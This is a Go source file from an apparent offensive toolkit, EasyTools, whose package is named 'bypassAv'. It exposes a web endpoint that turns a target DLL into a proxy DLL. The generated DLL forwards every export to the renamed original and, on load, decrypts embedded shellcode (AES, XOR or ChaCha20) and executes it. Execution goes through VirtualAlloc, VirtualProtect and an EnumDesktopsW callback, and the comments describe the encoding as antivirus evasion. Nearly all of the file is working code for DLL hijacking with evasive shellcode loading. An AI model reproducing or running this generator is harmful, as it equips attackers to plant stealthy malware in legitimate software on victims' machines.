package bypassAv

import (
	"EasyTools/app/bypass/shell/encode"
	util "EasyTools/app/bypass/shell/util"
	"EasyTools/app/bypass/skyshadow"
	"bufio"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// dllProxyRequest 请求参数
type dllProxyRequest struct {
	DllPath      string `json:"dllPath" form:"dllPath"`           // 必填：目标 DLL 路径
	EncodeWay    string `json:"encodeWay" form:"encodeWay"`       // 复用免杀编码方式：aes/xor/chacha20
	OutputDir    string `json:"outputDir" form:"outputDir"`       // 可选：输出目录
	ForceArch    string `json:"forceArch" form:"forceArch"`       // 可选：强制指定架构 (x86/x64)，覆盖自动检测
	MinGW32Path  string `json:"mingw32Path" form:"mingw32Path"`   // 可选：MinGW32 路径，默认从环境变量或常见路径查找
	MinGW64Path  string `json:"mingw64Path" form:"mingw64Path"`   // 可选：MinGW64 路径，默认从环境变量或常见路径查找
	ProxyDllName string `json:"proxyDllName" form:"proxyDllName"` // 可选：用户自定义的代理后 DLL 名称（原始DLL重命名后的名称）
}

type GenerateDllResult struct {
	DllName string `json:"dllName"`
	Success bool   `json:"success"`
	Message string `json:"message"`
}

type exportFunc struct {
	Name    string
	Ordinal uint16
}

// RunDllProxyGenerate 生成 DLL 代理转发（基于现有免杀预处理产物）
func RunDllProxyGenerate(c *gin.Context) {
	// 检查授权
	// 依赖 Windows 工具链（dumpbin.exe / MinGW），非 Windows 平台给出明确提示
	if runtime.GOOS != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "DLL 代理转发依赖 Windows 工具链（dumpbin.exe/MinGW），请在 Windows 平台使用该功能",
		})
		return
	}

	// 尝试绑定 JSON 或 multipart/form
	var req dllProxyRequest
	_ = c.ShouldBind(&req)

	req.DllPath = strings.TrimSpace(req.DllPath)
	// 如果没有显式提供 dllPath，则尝试从上传的文件中获取
	if req.DllPath == "" {
		file, err := c.FormFile("dllFile")
		if err != nil {
			c.JSON(400, gin.H{"success": false, "error": "请提供 dllPath 或上传 DLL 文件"})
			return
		}
		uploadDir := filepath.Join(os.TempDir(), "EasyTools", "dllproxy_upload")
		if err := os.MkdirAll(uploadDir, 0755); err != nil {
			c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("创建临时目录失败: %v", err)})
			return
		}
		savePath := filepath.Join(uploadDir, filepath.Base(file.Filename))
		if err := c.SaveUploadedFile(file, savePath); err != nil {
			c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("保存上传的 DLL 失败: %v", err)})
			return
		}
		req.DllPath = savePath
	}
	if !strings.HasSuffix(strings.ToLower(req.DllPath), ".dll") {
		c.JSON(400, gin.H{"success": false, "error": "文件必须是 .dll"})
		return
	}
	// 安全校验：DLL 源路径只允许位于应用输出目录或本应用临时目录内，
	// 防止利用该接口读取/解析任意本地文件
	{
		currentDir, _ := os.Getwd()
		appOutRoot := filepath.Join(currentDir, "EasyToolsFiles", "file")
		tempRoot := filepath.Join(os.TempDir(), "EasyTools")
		allowed := false
		for _, root := range []string{appOutRoot, tempRoot} {
			if abs, err := filepath.Abs(req.DllPath); err == nil {
				if rel, err := filepath.Rel(filepath.Clean(root), filepath.Clean(abs)); err == nil &&
					rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
					allowed = true
					break
				}
			}
		}
		if !allowed {
			c.JSON(400, gin.H{"success": false, "error": "dllPath 必须在应用输出目录或临时目录内"})
			return
		}
	}
	if _, err := os.Stat(req.DllPath); err != nil {
		c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("DLL 文件不存在: %v", err)})
		return
	}

	encodeWay := strings.ToLower(strings.TrimSpace(req.EncodeWay))
	if encodeWay == "" {
		encodeWay = "aes" // 默认沿用 aes
	}

	// 预处理目录（复用现有免杀输出，也是 go.mod 所在目录）
	preDir := filepath.Join(os.TempDir(), "EasyTools", "file")
	encoded, key, nonce, err := loadEncodedShellcode(preDir, encodeWay)
	if err != nil {
		// 尝试在本接口内自动生成一次加密产物，避免用户必须再跑一遍 make
		if genErr := generateEncodedShellcode(preDir, encodeWay); genErr != nil {
			c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("请先在免杀模块完成预处理: %v", genErr)})
			return
		}
		encoded, key, nonce, err = loadEncodedShellcode(preDir, encodeWay)
		if err != nil {
			c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("请先在免杀模块完成预处理: %v", err)})
			return
		}
	}

	// 准备 dumpbin.exe（复用 SkyShadow 的 embed 释放逻辑）
	dumpbinPath, cleanupDumpbin, err := skyshadow.PrepareDumpbin()
	if err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("准备 dumpbin.exe 失败: %v", err)})
		return
	}
	defer cleanupDumpbin()

	// 确保预处理生成的 go.mod / go.sum 存在（沿用原始预处理逻辑）
	if err := util.InitGoModule(); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("初始化 Go 模块失败: %v", err)})
		return
	}

	// 检测 DLL 位数（自动检测或手动指定）
	var bitness string
	var detectedArch string
	if req.ForceArch != "" {
		// 手动指定架构（兼容 x64/x86 与 amd64/386 写法）
		bitness = "x64"
		if util.NormalizeGoArch(req.ForceArch) == "386" {
			bitness = "x86"
		}
		detectedArch = "手动指定: " + bitness
	} else {
		// 自动检测架构
		var err error
		detectedBitness, err := detectBitness(req.DllPath)
		if err != nil {
			c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("自动检测 DLL 架构失败: %v，请手动指定 forceArch 参数", err)})
			return
		}
		if detectedBitness != "x86" && detectedBitness != "x64" {
			c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("检测到不支持的架构: %s，仅支持 x86 或 x64，请手动指定 forceArch", detectedBitness)})
			return
		}
		bitness = detectedBitness
		detectedArch = "自动检测: " + bitness
	}

	// 提取导出函数
	exports, err := parseExportsWithDumpbin(dumpbinPath, req.DllPath)
	if err != nil {
		c.JSON(400, gin.H{"success": false, "error": fmt.Sprintf("解析 DLL 导出失败: %v", err)})
		return
	}
	if len(exports) == 0 {
		c.JSON(400, gin.H{"success": false, "error": "DLL 无导出函数"})
		return
	}

	// 输出目录：强制限定在应用输出目录内，拒绝任意路径写入
	outputDir := strings.TrimSpace(req.OutputDir)
	currentDir, _ := os.Getwd()
	defaultOutputDir := filepath.Join("EasyToolsFiles", "file", "dllproxy")
	if outputDir == "" {
		outputDir = defaultOutputDir
	}
	if !filepath.IsAbs(outputDir) {
		outputDir = filepath.Join(currentDir, outputDir)
	}
	{
		appOutRoot := filepath.Join(currentDir, "EasyToolsFiles", "file")
		rel, err := filepath.Rel(filepath.Clean(appOutRoot), filepath.Clean(outputDir))
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			c.JSON(400, gin.H{"success": false, "error": "outputDir 必须在 EasyToolsFiles/file 目录内"})
			return
		}
	}
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("创建输出目录失败: %v", err)})
		return
	}

	dllName := filepath.Base(req.DllPath)
	// 如果用户指定了自定义的代理后 DLL 名称，则使用用户指定的名称，否则自动生成
	var origCopyName string
	if req.ProxyDllName != "" && strings.TrimSpace(req.ProxyDllName) != "" {
		customName := sanitizeFileNameSegment(req.ProxyDllName, "")
		if customName == "" {
			c.JSON(400, gin.H{"success": false, "error": "非法的代理 DLL 名称"})
			return
		}
		// 确保名称以 .dll 结尾
		if !strings.HasSuffix(strings.ToLower(customName), ".dll") {
			customName = customName + ".dll"
		}
		origCopyName = customName
	} else {
		origCopyName = strings.TrimSuffix(dllName, ".dll") + ".orig.dll"
	}

	// 生成 Go 源码
	goCode := buildProxySource(dllName, origCopyName, encodeWay, encoded, key, nonce)

	// 工作目录放在预处理目录下，沿用已有 go.mod / go.sum
	workDir := filepath.Join(preDir, "dllproxy_work")
	_ = os.RemoveAll(workDir)
	if err := os.MkdirAll(workDir, 0755); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("创建工作目录失败: %v", err)})
		return
	}

	// 写入源码
	srcPath := filepath.Join(workDir, "proxy.go")
	if err := os.WriteFile(srcPath, []byte(goCode), 0644); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("写入源码失败: %v", err)})
		return
	}

	// 生成 def 文件以保留 ordinal，并让 forward 生效
	defPath := filepath.Join(workDir, "exports.def")
	if err := os.WriteFile(defPath, []byte(buildDef(dllName, origCopyName, exports)), 0644); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("写入 def 失败: %v", err)})
		return
	}

	// 依赖已由上方 util.InitGoModule() 统一写入 go.mod（含 golang.org/x/sys），
	// 编译时从全局模块缓存直接复用，无需每次在此重复 go get 联网安装

	// 根据位数设置编译环境
	env := os.Environ()
	env = append(env, "GOOS=windows")
	env = append(env, "CGO_ENABLED=1")

	var ccPath, newPath string
	if bitness == "x86" {
		env = append(env, "GOARCH=386")
		// 编译器路径只信任内置查找结果（拒绝用户任意指定路径，防止 CC 指向任意可执行文件）
		mingw32Path := findMinGWPath("mingw32")
		if mingw32Path == "" {
			c.JSON(500, gin.H{"success": false, "error": "未找到 MinGW32 编译器，请安装 MinGW32 并配置 PATH"})
			return
		}
		ccPath = filepath.Join(mingw32Path, "bin", "gcc.exe")
		newPath = filepath.Join(mingw32Path, "bin") + ";" + os.Getenv("PATH")
	} else {
		env = append(env, "GOARCH=amd64")
		// 编译器路径只信任内置查找结果
		mingw64Path := findMinGWPath("mingw64")
		if mingw64Path == "" {
			c.JSON(500, gin.H{"success": false, "error": "未找到 MinGW64 编译器，请安装 MinGW64 并配置 PATH"})
			return
		}
		ccPath = filepath.Join(mingw64Path, "bin", "gcc.exe")
		newPath = filepath.Join(mingw64Path, "bin") + ";" + os.Getenv("PATH")
	}

	// 校验编译器必须是 MinGW 目录下的 gcc.exe（防路径被篡改/符号链接指向任意程序）
	{
		ccBase := strings.ToLower(filepath.Base(ccPath))
		dirBase := strings.ToLower(filepath.Base(filepath.Dir(ccPath)))
		if ccBase != "gcc.exe" || !strings.Contains(dirBase, "mingw") {
			c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("编译器路径异常: %s", ccPath)})
			return
		}
	}

	// 检查编译器是否存在
	if _, err := os.Stat(ccPath); os.IsNotExist(err) {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("编译器不存在: %s，请检查路径配置", ccPath)})
		return
	}

	env = append(env, "CC="+ccPath)
	env = append(env, "PATH="+newPath)

	// go build，使用与 main.go 完全相同的配置格式
	outputDll := filepath.Join(workDir, dllName)
	// 使用与 main.go 完全相同的 extldflags 格式：-extldflags="-Wl,"+defFile
	extld := fmt.Sprintf("-Wl,%s", defPath)
	cmd := exec.Command("go", "build",
		"-buildmode=c-shared",
		"--trimpath",
		"-ldflags", fmt.Sprintf("-s -w -extldflags=\"%s\"", extld),
		"-o", outputDll, srcPath)
	cmd.Dir = workDir
	cmd.Env = env
	cmd.SysProcAttr = util.HideWindowAttr()
	if out, err := cmd.CombinedOutput(); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("编译失败: %v\n%s\n架构: %s\n编译器: %s", err, string(out), bitness, ccPath)})
		return
	}

	// 拷贝输出
	origOut := filepath.Join(outputDir, origCopyName)
	proxyOut := filepath.Join(outputDir, dllName)
	if err := copyFile(req.DllPath, origOut); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("备份原 DLL 失败: %v", err)})
		return
	}
	if err := copyFile(outputDll, proxyOut); err != nil {
		c.JSON(500, gin.H{"success": false, "error": fmt.Sprintf("输出代理 DLL 失败: %v", err)})
		return
	}

	_ = os.RemoveAll(workDir)

	c.JSON(200, gin.H{
		"success":      true,
		"message":      "生成成功",
		"details":      []GenerateDllResult{{DllName: dllName, Success: true, Message: "生成并导出完成"}},
		"outputDir":    outputDir,
		"proxyDll":     proxyOut,
		"origDll":      origOut,
		"forwardTo":    origCopyName,
		"bitness":      bitness,
		"archInfo":     detectedArch,
		"compiler":     ccPath,
		"autoDetected": req.ForceArch == "",
	})
}

// 读取预处理产物
func loadEncodedShellcode(base, encodeWay string) (enc, key, nonce []byte, err error) {
	switch encodeWay {
	case "aes":
		enc, err = os.ReadFile(filepath.Join(base, "AesEncrypted.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
		key, err = os.ReadFile(filepath.Join(base, "AesKey.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
	case "xor":
		enc, err = os.ReadFile(filepath.Join(base, "XorEncrypted.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
		key, err = os.ReadFile(filepath.Join(base, "XorKey.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
	case "chacha20":
		enc, err = os.ReadFile(filepath.Join(base, "ChaCha20Encrypted.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
		key, err = os.ReadFile(filepath.Join(base, "ChaCha20Key.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
		nonce, err = os.ReadFile(filepath.Join(base, "ChaCha20Nonce.txt"))
		if err != nil {
			return nil, nil, nil, err
		}
	default:
		return nil, nil, nil, fmt.Errorf("不支持的 encodeWay: %s", encodeWay)
	}
	return enc, key, nonce, nil
}

// generateEncodedShellcode 在缺少预处理产物时就地生成一次，避免用户必须再跑 make。
// 依赖 upload 产生的 payload.bin（混淆落盘，此处自动还原）。
func generateEncodedShellcode(base, encodeWay string) error {
	payloadPath := filepath.Join(base, encode.PayloadBinName)
	payload, err := encode.ReadPayloadAtRestRetry(payloadPath, 4, 400*time.Millisecond)
	if err != nil {
		return fmt.Errorf("未找到 payload.bin，请先上传并完成 shellcode 预处理: %v", err)
	}
	payload = append([]byte(nil), payload...)

	if err := os.MkdirAll(base, 0755); err != nil {
		return fmt.Errorf("创建目录失败: %v", err)
	}

	switch encodeWay {
	case "aes":
		key := encode.GenerateAesKey()
		enc, err := encode.Aes_Encrypt(payload, key)
		if err != nil {
			return fmt.Errorf("AES 加密失败: %v", err)
		}
		if err := os.WriteFile(filepath.Join(base, "AesEncrypted.txt"), enc, 0644); err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(base, "AesKey.txt"), key, 0644); err != nil {
			return err
		}
	case "xor":
		key, err := encode.GenerateXorKey()
		if err != nil {
			return fmt.Errorf("生成 XOR 密钥失败: %v", err)
		}
		enc := encode.XorEncrypt(payload, key)
		keyBytes := encode.XorKeyToBytes(key)
		if err := os.WriteFile(filepath.Join(base, "XorEncrypted.txt"), enc, 0644); err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(base, "XorKey.txt"), keyBytes, 0644); err != nil {
			return err
		}
	case "chacha20":
		key, err := encode.GenerateChaCha20Key()
		if err != nil {
			return fmt.Errorf("生成 ChaCha20 密钥失败: %v", err)
		}
		nonce, err := encode.GenerateChaCha20Nonce()
		if err != nil {
			return fmt.Errorf("生成 ChaCha20 nonce 失败: %v", err)
		}
		enc, err := encode.ChaCha20Encrypt(key, nonce, payload)
		if err != nil {
			return fmt.Errorf("ChaCha20 加密失败: %v", err)
		}
		if err := os.WriteFile(filepath.Join(base, "ChaCha20Encrypted.txt"), enc, 0644); err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(base, "ChaCha20Key.txt"), key, 0644); err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(base, "ChaCha20Nonce.txt"), nonce, 0644); err != nil {
			return err
		}
	default:
		return fmt.Errorf("不支持的 encodeWay: %s", encodeWay)
	}

	return nil
}

// 解析导出（使用 dumpbin）
func parseExportsWithDumpbin(dumpbinPath, dllPath string) ([]exportFunc, error) {
	cmd := exec.Command(dumpbinPath, "/exports", dllPath)
	cmd.SysProcAttr = util.HideWindowAttr()
	out, err := cmd.CombinedOutput()
	if err != nil {
		// 将 dumpbin 的输出也返回，方便定位是架构不匹配、文件损坏还是工具缺失
		return nil, fmt.Errorf("dumpbin 执行失败: %v\n%s", err, string(out))
	}

	var res []exportFunc
	sc := bufio.NewScanner(strings.NewReader(string(out)))
	found := false
	re := regexp.MustCompile(`^\s*(\d+)\s+[0-9A-F]+\s+[0-9A-F]+\s+(\S+)$`)
	for sc.Scan() {
		line := sc.Text()
		if strings.Contains(line, "ordinal hint RVA") {
			found = true
			continue
		}
		if strings.Contains(line, "Summary") {
			break
		}
		if !found {
			continue
		}
		m := re.FindStringSubmatch(line)
		if len(m) == 3 {
			ord64, _ := strconv.ParseUint(m[1], 10, 16)
			res = append(res, exportFunc{
				Name:    m[2],
				Ordinal: uint16(ord64),
			})
		}
	}
	return res, nil
}

// 生成 def，使用 forwarder 将导出转发到重命名后的原始 DLL
func buildDef(dllName, forwardDll string, exports []exportFunc) string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("LIBRARY %s\nEXPORTS\n", dllName))
	for _, e := range exports {
		if e.Ordinal == 0 {
			b.WriteString(fmt.Sprintf("    %s=%s.%s\n", e.Name, forwardDll, e.Name))
		} else {
			b.WriteString(fmt.Sprintf("    %s=%s.%s @%d\n", e.Name, forwardDll, e.Name, e.Ordinal))
		}
	}
	return b.String()
}

// 生成 Go 源码，仅负责运行一次 shellcode，真正的导出由 def forward 到原始 DLL
func buildProxySource(origName, forwardDll string, encodeWay string, enc, key, nonce []byte) string {
	_ = origName
	encHex := hex.EncodeToString(enc)
	keyHex := hex.EncodeToString(key)
	nonceHex := hex.EncodeToString(nonce)

	// 根据编码方式决定额外的导入
	importLines := []string{
		`"encoding/hex"`,
		`"sync"`,
		`"unsafe"`,
		`"golang.org/x/sys/windows"`,
	}

	var decodeBlock string
	switch encodeWay {
	case "aes":
		importLines = append(importLines, `"crypto/aes"`, `"crypto/cipher"`)
		decodeBlock = `
func decodeShellcode() []byte {
	enc, _ := hex.DecodeString("` + encHex + `")
	key, _ := hex.DecodeString("` + keyHex + `")
	block, _ := aes.NewCipher(key)
	iv := enc[:block.BlockSize()]
	ct := enc[block.BlockSize():]
	mode := cipher.NewCBCDecrypter(block, iv)
	pt := make([]byte, len(ct))
	mode.CryptBlocks(pt, ct)
	pad := int(pt[len(pt)-1])
	if pad > 0 && pad <= block.BlockSize() {
		pt = pt[:len(pt)-pad]
	}
	return pt
}`
	case "xor":
		decodeBlock = `
func decodeShellcode() []byte {
	enc, _ := hex.DecodeString("` + encHex + `")
	key, _ := hex.DecodeString("` + keyHex + `")
	out := make([]byte, len(enc))
	for i := range enc {
		out[i] = enc[i] ^ key[i%len(key)]
	}
	return out
}`
	case "chacha20":
		importLines = append(importLines, `"golang.org/x/crypto/chacha20"`)
		decodeBlock = `
func decodeShellcode() []byte {
	enc, _ := hex.DecodeString("` + encHex + `")
	key, _ := hex.DecodeString("` + keyHex + `")
	nonce, _ := hex.DecodeString("` + nonceHex + `")
	out := make([]byte, len(enc))
	c, _ := chacha20.NewUnauthenticatedCipher(key, nonce)
	c.XORKeyStream(out, enc)
	return out
}`
	}

	return fmt.Sprintf(`package main

/*
#include <windows.h>
*/
import "C"

import (
	%s
)

var (
	forwardDLL = "%s"
	once sync.Once
	shellcode []byte
)

%s

func runShellcode() {
	once.Do(func() {
		shellcode = decodeShellcode()
		kernel32 := windows.NewLazyDLL("kernel32.dll")
		ntdll := windows.NewLazyDLL("ntdll.dll")
		User32 := windows.NewLazyDLL("User32.dll")
		VirtualAlloc := kernel32.NewProc("VirtualAlloc")
		RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
		VirtualProtect := kernel32.NewProc("VirtualProtect")
		EnumDesktopsW := User32.NewProc("EnumDesktopsW")
		GetProcessWindowStation := User32.NewProc("GetProcessWindowStation")

		addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000, 0x04)
		RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
		oldProtect := uintptr(0x04)
		_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))
		Process, _, _ := GetProcessWindowStation.Call()
		EnumDesktopsW.Call(Process, addr, 0)
	})
}

func init() {
	// 异步运行 shellcode，不阻塞 DLL 加载
	// def 文件转发由链接器处理，无需在运行时预先加载 DLL
	go runShellcode()
}

func main() {}
`, strings.Join(importLines, "\n\t"), forwardDll, decodeBlock)
}

// detectBitness 通过解析 PE 头，返回 "x64"、"x86" 或 "unknown"
func detectBitness(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "unknown", fmt.Errorf("无法打开文件: %w", err)
	}
	defer f.Close()

	// 读取DOS头
	dosHeader := make([]byte, 64)
	if _, err := f.Read(dosHeader); err != nil {
		return "unknown", fmt.Errorf("读取DOS头失败: %w", err)
	}

	// 检查DOS签名 "MZ"
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return "unknown", fmt.Errorf("不是有效的PE文件: 缺少MZ签名")
	}

	// 获取PE头偏移量
	peOffset := int64(binary.LittleEndian.Uint32(dosHeader[0x3C:]))

	// 读取PE签名
	f.Seek(peOffset, io.SeekStart)
	peSignature := make([]byte, 4)
	if _, err := f.Read(peSignature); err != nil {
		return "unknown", fmt.Errorf("读取PE签名失败: %w", err)
	}

	// 检查PE签名 "PE\0\0"
	if peSignature[0] != 'P' || peSignature[1] != 'E' || peSignature[2] != 0 || peSignature[3] != 0 {
		return "unknown", fmt.Errorf("不是有效的PE文件: 缺少PE签名")
	}

	// 读取COFF文件头
	coffHeader := make([]byte, 20)
	if _, err := f.Read(coffHeader); err != nil {
		return "unknown", fmt.Errorf("读取COFF头失败: %w", err)
	}

	// 提取机器类型
	machine := binary.LittleEndian.Uint16(coffHeader[0:2])

	switch machine {
	case 0x014C: // IMAGE_FILE_MACHINE_I386
		return "x86", nil
	case 0x8664: // IMAGE_FILE_MACHINE_AMD64
		return "x64", nil
	case 0x0200: // IMAGE_FILE_MACHINE_IA64
		return "ia64", nil
	case 0x01C4: // IMAGE_FILE_MACHINE_ARMNT
		return "arm", nil
	case 0xAA64: // IMAGE_FILE_MACHINE_ARM64
		return "arm64", nil
	default:
		return "unknown", fmt.Errorf("未知的机器类型: 0x%04X", machine)
	}
}

// findMinGWPath 查找 MinGW 安装路径（调用 util 包的共享函数）
func findMinGWPath(arch string) string {
	return util.FindMinGWPath(arch)
}
